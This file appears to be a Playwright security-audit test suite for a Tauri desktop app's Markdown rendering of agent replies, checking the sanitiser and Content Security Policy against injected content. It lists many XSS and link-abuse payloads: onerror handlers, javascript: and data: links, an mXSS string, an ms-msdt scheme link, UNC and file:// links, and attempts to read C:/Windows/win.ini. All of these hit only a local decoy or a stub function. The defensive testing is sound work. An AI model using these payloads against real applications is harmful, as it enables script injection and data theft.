// Audit 2026-11, black box: what a third party writes and the window shows. The fake harness says back what it is
// sent (« Bonjour, tu as dit : … »): its reply is rendered as an agent's Markdown, the way a real agent's is after it
// read a README, a pull request or a web page somebody else wrote. Each payload tries to run a script in the window
// (which would reach Tauri's `invoke`), to load something from the network, or to lead a click somewhere else.
import fs from 'node:fs';
import http from 'node:http';
import path from 'node:path';
import type { Page } from '@playwright/test';
import { addProject, expect, send, test } from '../../../../../tests/e2e/fixture';
import { keep, PORTS } from './helpers';

/** A page of the web somebody else holds: it only notes what asks it for something. */
const decoy = { hits: [] as string[], server: null as http.Server | null };
const DECOY = `http://127.0.0.1:${PORTS.decoy}`;

test.beforeAll(async () => {
  decoy.server = http.createServer((req, res) => {
    decoy.hits.push(`${req.method} ${req.url}`);
    res.writeHead(200, { 'Content-Type': 'text/html', 'Access-Control-Allow-Origin': '*' }).end('<h1>decoy</h1>');
  });
  await new Promise<void>((resolve) => decoy.server!.listen(PORTS.decoy, '127.0.0.1', resolve));
});

test.afterAll(async () => {
  await new Promise((resolve) => decoy.server?.close(resolve));
});

/** Before any payload: a function a script would call, the CSP's refusals, and what the window asks to open outside. */
async function watch(page: Page) {
  await page.evaluate(() => {
    const w = window as unknown as {
      __audit: (n: string) => void;
      auditRan: string[];
      auditCsp: string[];
      auditOpened: string[];
      auditMark: boolean;
    };
    w.auditRan = [];
    w.auditCsp = [];
    w.auditOpened = [];
    w.auditMark = true;
    w.__audit = (n) => w.auditRan.push(n);
    document.addEventListener('securitypolicyviolation', (e) =>
      w.auditCsp.push(`${e.effectiveDirective} blocked ${e.blockedURI || 'inline'}`),
    );
    const fetch = window.fetch.bind(window);
    window.fetch = (input, init) => {
      const command = decodeURIComponent(String(input instanceof Request ? input.url : input));
      if (command.includes('open_url') || command.includes('open_path')) {
        w.auditOpened.push(String(init?.body ?? ''));
        return Promise.resolve(new Response('null', { headers: { 'Content-Type': 'application/json', 'Tauri-Response': 'ok' } }));
      }
      return fetch(input, init);
    };
  });
}

const read = (page: Page) =>
  page.evaluate(() => {
    const w = window as unknown as { auditRan: string[]; auditCsp: string[]; auditOpened: string[]; auditMark?: boolean };
    return { ran: w.auditRan, csp: w.auditCsp, opened: w.auditOpened, stillTheApp: w.auditMark === true };
  });

const PAYLOADS: [string, string][] = [
  ['script', `<script>__audit('script')</script>`],
  ['script-src', `<script src="${DECOY}/script.js"></script>`],
  ['img-onerror', `<img src=x onerror="__audit('img-onerror')">`],
  ['img-remote-html', `<img src="${DECOY}/pixel-html.png?secret=1">`],
  ['img-remote-markdown', `![suivi](${DECOY}/pixel-md.png?secret=1)`],
  ['img-remote-https', `![suivi](https://127.0.0.1:${PORTS.decoy}/pixel-https.png)`],
  ['svg-onload', `<svg onload="__audit('svg-onload')"><circle r=1 /></svg>`],
  ['iframe-javascript', `<iframe src="javascript:parent.__audit('iframe-js')"></iframe>`],
  ['iframe-srcdoc', `<iframe srcdoc="<script>parent.__audit('iframe-srcdoc')</script>"></iframe>`],
  ['iframe-remote', `<iframe src="${DECOY}/frame.html"></iframe>`],
  ['link-javascript', `[clique](javascript:__audit('link-js'))`],
  ['link-javascript-html', `<a href="javascript:__audit('a-js')">clique</a>`],
  ['link-data', `[clique](data:text/html,<script>__audit('link-data')</script>)`],
  ['link-file', `[clique](file:///C:/Windows/System32/calc.exe)`],
  ['link-unc', `[clique](\\\\\\\\127.0.0.1\\\\share\\\\x.exe)`],
  ['link-scheme', `[clique](ms-msdt:/id PCWDiagnostic)`],
  ['link-escouade', `[clique](escouade://plugin/dev.exemple.x)`],
  ['style-tag', `<style>body{display:none!important}</style>`],
  ['style-attribute', `<div style="position:fixed;inset:0;background:red;z-index:99999" id="audit-overlay">recouvre</div>`],
  ['form', `<form action="${DECOY}/form" method="post"><input name="jeton" value="x"><button>Envoyer</button></form>`],
  ['base', `<base href="${DECOY}/">`],
  ['meta-refresh', `<meta http-equiv="refresh" content="0;url=${DECOY}/meta-refresh">`],
  ['link-stylesheet', `<link rel="stylesheet" href="${DECOY}/style.css">`],
  ['object-embed', `<object data="${DECOY}/object"></object><embed src="${DECOY}/embed">`],
  ['details-ontoggle', `<details open ontoggle="__audit('details')"><summary>x</summary></details>`],
  ['math-href', `<math><mtext><table><mglyph><style><!--</style><img title="--&gt;&lt;img src=1 onerror=__audit('mxss')&gt;">`],
  ['markdown-html-in-link', `[<img src=x onerror=__audit('md-link-img')>](https://example.com)`],
  ['markdown-autolink', `<javascript:__audit('autolink')>`],
  ['markdown-reference', `[x]: javascript:__audit('ref')\n\n[clique][x]`],
  ['entity', `&lt;script&gt;__audit('entity')&lt;/script&gt; &#60;img src=x onerror=__audit('entity2')&#62;`],
  ['code-fence', '```html\n<script>__audit("fence")</script>\n```'],
  ['data-attribute', `<span data-remote-src="${DECOY}/forged.png" data-show-img>x</span>`],
];

test('nothing a message holds runs in the window, loads from the network, or leads a click out of the web', async ({ app }) => {
  const { page } = app;
  await addProject(page, app.repo);
  await watch(page);
  const outcomes: Record<string, unknown> = {};
  for (const [name, payload] of PAYLOADS) {
    await send(page, `${name} : ${payload}`);
    // The reply says the message back, its name first (the list only keeps its last messages in the page).
    await expect(page.locator('.md').last()).toContainText(`tu as dit : ${name} :`, { timeout: 30_000 });
    await page.waitForTimeout(400);
    // What the reply became in the page: the elements a payload wanted are text, or gone.
    outcomes[name] = await page.evaluate(() => {
      const md = [...document.querySelectorAll('.md')].at(-1)!;
      const count = (sel: string) => md.querySelectorAll(sel).length;
      const handlers = [...md.querySelectorAll('*')].filter((e) => [...e.attributes].some((a) => a.name.startsWith('on'))).length;
      return {
        shownAsText: (md.textContent ?? '').slice(0, 90),
        script: count('script'),
        iframe: count('iframe'),
        style: count('style'),
        form: count('form, input'),
        objectOrEmbed: count('object, embed'),
        baseMetaLink: count('base, meta, link'),
        svg: count('svg'),
        imagesLoaded: [...md.querySelectorAll('img')].map((i) => i.getAttribute('src')?.slice(0, 40)),
        eventHandlers: handlers,
        styleAttributes: count('[style]'),
        links: [...md.querySelectorAll('a')].map((a) => a.getAttribute('href')),
      };
    });
  }
  // Every link a payload left is clicked: the window opens the web's addresses outside, and nothing else.
  const links = page.locator('.md a');
  for (let i = 0; i < (await links.count()); i++) {
    await links
      .nth(i)
      .click({ timeout: 5000 })
      .catch(() => {});
  }
  await page.waitForTimeout(1500);
  const seen = await read(page);
  const overlay = await page.locator('#audit-overlay').count();
  keep('content-markdown', {
    payloads: PAYLOADS.length,
    outcomes,
    scriptsThatRan: seen.ran,
    csp: seen.csp,
    askedToOpenOutside: seen.opened,
    requestsToTheDecoy: decoy.hits,
    overlayElement: overlay,
  });
  expect(seen.ran, 'a payload ran a script in the window').toEqual([]);
  expect(decoy.hits, 'the window loaded something from the network').toEqual([]);
  expect(seen.stillTheApp).toBe(true);
  for (const o of Object.values(outcomes) as Record<string, number | unknown[]>[]) {
    expect([o.script, o.iframe, o.style, o.form, o.objectOrEmbed, o.baseMetaLink, o.eventHandlers, o.styleAttributes]).toEqual([
      0, 0, 0, 0, 0, 0, 0, 0,
    ]);
    expect(o.imagesLoaded).toEqual([]);
  }
  for (const asked of seen.opened) expect(asked).toMatch(/"url":"(https?:|mailto:)/);
});

test('the policy of the window stops what a script injected in it would try', async ({ app }) => {
  const { page } = app;
  await addProject(page, app.repo);
  await watch(page);
  // Here the test itself writes in the page, as a flaw of the sanitizer would let a message do: what does the Content
  // Security Policy still stop?
  const tried = await page.evaluate(async (decoy) => {
    const out: Record<string, string> = {};
    const w = window as unknown as { auditRan: string[] };
    const wait = (ms: number) => new Promise((r) => setTimeout(r, ms));
    const ran = (name: string) => (w.auditRan.includes(name) ? 'RAN' : 'blocked');
    const add = (html: string) => {
      const d = document.createElement('div');
      d.innerHTML = html;
      document.body.appendChild(d);
      return d;
    };
    // An inline script, by the parser and by the DOM.
    const s = document.createElement('script');
    s.textContent = "__audit('inline-script')";
    document.body.appendChild(s);
    out['inline <script>'] = ran('inline-script');
    const remote = document.createElement('script');
    remote.src = `${decoy}/remote.js`;
    document.body.appendChild(remote);
    // An event handler written as an attribute.
    const b = add(`<button id="audit-b" onclick="__audit('inline-handler')">x</button>`);
    (b.querySelector('#audit-b') as HTMLButtonElement).click();
    out['inline event handler'] = ran('inline-handler');
    add(`<img src="x" onerror="__audit('img-onerror')">`);
    await wait(300);
    out['<img onerror>'] = ran('img-onerror');
    add(`<a id="audit-a" href="javascript:__audit('js-url')">x</a>`);
    try {
      eval("__audit('eval')");
    } catch {
      // Refused.
    }
    out['eval'] = ran('eval');
    try {
      new Function("__audit('function')")();
    } catch {
      // Refused.
    }
    out['new Function'] = ran('function');
    try {
      setTimeout("__audit('timeout-string')" as unknown as () => void, 0);
    } catch {
      // Refused.
    }
    await wait(200);
    out['setTimeout of a string'] = ran('timeout-string');
    // The network, out of the app.
    out['fetch'] = await fetch(`${decoy}/fetch`).then(
      () => 'WENT',
      () => 'blocked',
    );
    out['XMLHttpRequest'] = await new Promise((resolve) => {
      const x = new XMLHttpRequest();
      x.onload = () => resolve('WENT');
      x.onerror = () => resolve('blocked');
      try {
        x.open('GET', `${decoy}/xhr`);
        x.send();
      } catch {
        resolve('blocked');
      }
    });
    out['WebSocket'] = await new Promise((resolve) => {
      try {
        const ws = new WebSocket(`${decoy.replace('http', 'ws')}/ws`);
        ws.onopen = () => resolve('WENT');
        ws.onerror = () => resolve('blocked');
      } catch {
        resolve('blocked');
      }
      setTimeout(() => resolve('blocked'), 1500);
    });
    out['sendBeacon'] = navigator.sendBeacon(`${decoy}/beacon`, 'x') ? 'queued' : 'blocked';
    add(`<img src="${decoy}/img.png">`);
    add(`<iframe src="${decoy}/frame.html"></iframe>`);
    add(`<link rel="stylesheet" href="${decoy}/style.css">`);
    add(`<video src="${decoy}/video.mp4"></video><audio src="${decoy}/audio.mp3"></audio>`);
    add(`<object data="${decoy}/object"></object>`);
    // A style of its own: allowed (`style-src 'unsafe-inline'`), SEC-05.
    const st = add(`<style>#audit-styled{color:rgb(1, 2, 3)}</style><span id="audit-styled">x</span>`);
    out['inline <style> (SEC-05)'] = getComputedStyle(st.querySelector('#audit-styled')!).color === 'rgb(1, 2, 3)' ? 'APPLIED' : 'blocked';
    const bg = add(`<span id="audit-bg" style="background:url(${decoy}/css-url.png)">x</span>`);
    void bg;
    await wait(1500);
    return out;
  }, DECOY);
  const seen = await read(page);
  keep('content-csp', {
    tried,
    csp: [...new Set(seen.csp)],
    requestsToTheDecoy: decoy.hits.filter((h) => !h.includes('pixel')),
    scriptsThatRan: seen.ran,
  });
  expect(seen.ran, 'a script ran despite the policy').toEqual([]);
  for (const name of [
    'inline <script>',
    'inline event handler',
    '<img onerror>',
    'eval',
    'new Function',
    'setTimeout of a string',
    'fetch',
    'XMLHttpRequest',
    'WebSocket',
  ]) {
    expect(tried[name], name).toBe('blocked');
  }
});

test('an image of a local path is read for the agent whose message it is, an image and nothing else', async ({ app }) => {
  const { page } = app;
  await addProject(page, app.repo);
  await watch(page);
  // A 1×1 PNG in the project, another outside it, and a file that is no image.
  const png = Buffer.from('iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNkYPhfDwAChwGA60e6kgAAAABJRU5ErkJggg==', 'base64');
  fs.writeFileSync(path.join(app.repo, 'inside.png'), png);
  const outside = path.join(app.root, 'outside.png');
  fs.writeFileSync(outside, png);
  const notImage = path.join(app.root, 'notes.txt');
  fs.writeFileSync(notImage, 'AUDIT-POC: no image');
  const slash = (p: string) => p.replace(/\\/g, '/');
  const shown: Record<string, { images: number; text: string }> = {};
  for (const [name, src] of [
    ['inside the project', 'inside.png'],
    ['outside the project', slash(outside)],
    ['a file that is no image', slash(notImage)],
    ['a system file', 'C:/Windows/win.ini'],
    ['a share', '//127.0.0.1/share/x.png'],
  ] as const) {
    await send(page, `${name} : ![image](${src})`);
    await expect(page.locator('.md').last()).toContainText(`tu as dit : ${name} :`, { timeout: 30_000 });
    await page.waitForTimeout(1500);
    shown[name] = await page.evaluate(() => {
      const md = [...document.querySelectorAll('.md')].at(-1)!;
      return {
        images: md.querySelectorAll('img').length,
        text: (md.querySelector('[data-img-off]')?.getAttribute('title') ?? '').slice(0, 60),
      };
    });
  }
  keep('content-local-images', shown);
  expect(shown['inside the project'].images).toBe(1);
  expect(shown['a file that is no image'].images).toBe(0);
  expect(shown['a system file'].images).toBe(0);
});
